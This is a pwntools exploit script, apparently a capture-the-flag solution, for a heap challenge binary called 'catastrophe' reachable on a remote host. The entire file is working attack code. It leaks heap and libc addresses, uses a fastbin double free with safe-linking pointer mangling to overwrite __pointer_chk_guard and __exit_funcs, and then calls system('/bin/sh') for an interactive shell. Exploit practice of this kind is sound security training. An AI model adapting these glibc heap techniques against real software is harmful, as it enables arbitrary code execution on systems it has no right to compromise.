from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './catastrophe'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    # p = remote('localhost', 7777)
    p = remote('mc.ax', 31273)
    libc = ELF('./libc.so.6')
    one_gadget = [0xebcf1, 0xebcf5, 0xebcf8]
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

def malloc(i, size, content):
    sendlineafter(p, b'> ', b'1')
    sendlineafter(p, b'> ', str(i).encode())
    sendlineafter(p, b'> ', str(size).encode())
    sendlineafter(p, b': ', content)

def free(i):
    sendlineafter(p, b'> ', b'2')
    sendlineafter(p, b'> ', str(i).encode())

def view(i):
    sendlineafter(p, b'> ', b'3')
    sendlineafter(p, b'> ', str(i).encode())
    return p.recvline()[:-1]

def protect_ptr(x, y):
    return (x >> 12) ^ y

ptr_guard = -0x2890
exit_funcs = 0x219838

for i in range(9):
    malloc(i, 0x98, b'A')
for i in range(7):
    free(i)
free(7)     # unsorted

heap = u64(view(0).ljust(8, b'\x00')) << 12
# libc.address = u64(view(7).ljust(8, b'\x00')) - 0x1ecbe0
libc.address = u64(view(7).ljust(8, b'\x00')) - 0x219ce0
print('heap: ' + hex(heap))
print('libc: ' + hex(libc.address))

for i in range(10):
    malloc(i, 0x58, b'A')
for i in range(7):
    free(i)
free(7)     # fastbin
free(8)
free(7)

for i in range(7):
    malloc(i, 0x58, b'A')

# Overwrite __pointer_chk_guard
malloc(7, 0x58, p64(protect_ptr(heap+0xa80, libc.address + ptr_guard)))
malloc(8, 0x58, b'A')
malloc(9, 0x58, b'A')
malloc(0, 0x58, b'\0'*8)

for i in range(10):
    malloc(i, 0x68, b'A')
for i in range(7):
    free(i)
free(7)     # fastbin
free(8)
free(7)

for i in range(7):
    malloc(i, 0x68, b'A')

# Overwrite __exit_funcs 
fn = libc.symbols['system']
fn = ((fn<<17)&((1<<64)-1)) | (fn>>(64-17))
malloc(7, 0x68, p64(protect_ptr(heap+0xf20, libc.address+exit_funcs-0x8)))
malloc(8, 0x68, b'A')
malloc(9, 0x68, p64(4)+p64(fn)+p64(next(libc.search(b'/bin/sh')))+p64(0))
malloc(0, 0x68, p64(heap+0xea0)*2)
sendlineafter(p, b'> ', b'4')
p.interactive()
